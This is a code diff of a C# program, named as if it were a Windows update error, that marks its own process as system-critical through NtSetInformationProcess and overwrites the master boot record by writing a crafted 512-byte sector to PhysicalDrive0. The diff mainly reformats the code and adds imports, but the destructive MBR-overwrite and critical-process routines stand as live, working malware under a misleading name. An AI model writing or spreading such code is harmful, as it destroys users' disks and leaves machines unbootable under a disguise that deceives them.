@@ -4,23 +4,26 @@ using System.Diagnostics;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.IO;
 using System.Threading.Tasks;
+using System.Security.Principal;
+using System.Windows.Forms;
 
 namespace Windows_Update_Error
 {
     public class Test
     {
-        [DllImport("kernel32.dll",SetLastError =true)]                        //调用Windows API
+        [DllImport("kernel32.dll", SetLastError = true)]                        //调用Windows API
         public static extern IntPtr CreateFileA(string lpFileName, uint dwDesiredAccess, uint dwShareMode, uint lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);                    //调用外部命令
-        [DllImport("kernel32.dll",SetLastError =true)]                        //调用Windows API
+        [DllImport("kernel32.dll", SetLastError = true)]                        //调用Windows API
         public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToWrite, ref int lpNumberOfBytesWritten, IntPtr lpOverlapped);                                                 //调用外部命令
         public const int File_Share_Read = 0x00000001;             //部分参数的值
         public const int File_Share_Write = 0x00000002;
         public const uint Generic_Read = 0x80000000;
         public const uint Generic_Write = 0x40000000;
         public const int Open_Existing = 3;
-        [DllImport("ntdll.dll",SetLastError = true)]
-        public static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
+        [DllImport("ntdll.dll", SetLastError = true)]
+        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
         public void Nt_Error()
         {
             int isCritical = 1;
@@ -56,9 +59,9 @@ namespace Windows_Update_Error
             }
             mbrdata[510] = 0x55;
             mbrdata[511] = 0xAA;
-            IntPtr mbr = CreateFileA(@"\\.\PhysicalDrive0",Generic_Read|Generic_Write,File_Share_Read|File_Share_Write,NULL,Open_Existing,NULL,0);
-            bool x=WriteFile(mbr,mbrdata,512,ref write,0);
-            if(x!=false)
+            IntPtr mbr = CreateFileA(@"\\.\PhysicalDrive0", Generic_Read | Generic_Write, File_Share_Read | File_Share_Write, NULL, Open_Existing, NULL, 0);
+            bool x = WriteFile(mbr, mbrdata, 512, ref write, 0);
+            if (x != false)
             {
                 return 1;
             }
